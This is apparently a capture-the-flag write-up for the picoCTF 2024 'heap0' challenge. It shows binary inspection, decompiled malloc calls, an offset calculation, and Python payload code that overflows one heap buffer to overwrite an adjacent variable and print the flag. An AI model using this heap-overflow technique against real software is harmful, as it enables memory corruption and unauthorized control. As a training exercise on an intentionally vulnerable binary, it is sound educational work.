## picoctf 2024 heap0
if we execute `file heap0`
```
heap0: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2015ade3c2b89f5069cb8c54dd750d1b9849062d, for GNU/Linux 3.2.0, with debug_info, not stripped
```
if we run the binary file, it would print this : 

```
Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5e35046636b0  ->   pico
+-------------+----------------+
[*]   0x5e35046636d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice:
```

then with idafree, we can see that there are only 2 malloc in the main function :
```
  input_data = (__int64)malloc(5uLL);
  strcpy((char *)input_data, "pico");
  safe_var = (char *)malloc(5uLL);
```

also with idafree, if we check the check_win() function, and we will print the flag if `if ( strcmp(safe_var, "bico"))` means that we have to fill the safe_var heap with value greater than "bico", in this case i just use "cico" because c is greater than b. this is the detailed explanation of what strcmp does : 
```
strcmp(str1, str2) = -1  // "apple" < "banana"
strcmp(str2, str1) = 1   // "banana" > "apple"
strcmp(str1, str3) = 0   // "apple" == "apple"
```

we have all the information we need. then this is our plan : 
1. calculate the offset between the second and the first heap
2. we fill the gap until we overwrite the second heap
3. the return value of strcmp in the check_win function has to become greater than 0 to print the flag.

with ipython, we can calculate the offset between the first and the second heap
```
hex(0x5e35046636d0-0x5e35046636b0)
0x20
```

so, 0x20 is the offset. so, we choose 2 to send the payload : 
```
c.recvuntil(b"Enter your choice: ")
c.sendline(b"2")
c.recvuntil(b"Data for buffer: ")

#AAAAAAAAAAAAAAAA000000000000000!cico
input_data = b"A" * 0x10
input_data += b"\x00" * 15
input_data += b"\x21"
input_data += b"cico"
c.sendline(input_data)
```

then we print by choosing 1 to make sure that we fill the heap correctly
```
c.recvuntil(b"Enter your choice: ")
c.sendline(b"1")
output_str = c.recvuntil(b"Enter your choice: ")
lines = output_str.splitlines()

# Print the output tidily
for line in lines:
    print(line)
```
the output would become like this: 
```
b'Heap State:'
b'+-------------+----------------+'
b'[*] Address   ->   Heap Data   '
b'+-------------+----------------+'
b'[*]   0x61d72e95a6b0  ->   AAAAAAAAAAAAAAAA'
b'+-------------+----------------+'
b'[*]   0x61d72e95a6d0  ->   cico'
b'+-------------+----------------+'
b''
b'1. Print Heap:\t\t(print the current state of the heap)'
b'2. Write to buffer:\t(write to your own personal block of data on the heap)'
b"3. Print safe_var:\t(I'll even let you look at my variable on the heap, I'm confident it can't be modified)"
b'4. Print Flag:\t\t(Try to print the flag, good luck)'
b'5. Exit'
b''
b'Enter your choice: '
```
voila, we overwrite the second heap with "cico". we can print the flag then. 
```
# Split the output into lines for better control
c.sendline(b"4")
print(c.recvuntil(b"}"))
```

```
b'\nYOU WIN\nflag{abcdef}'
```



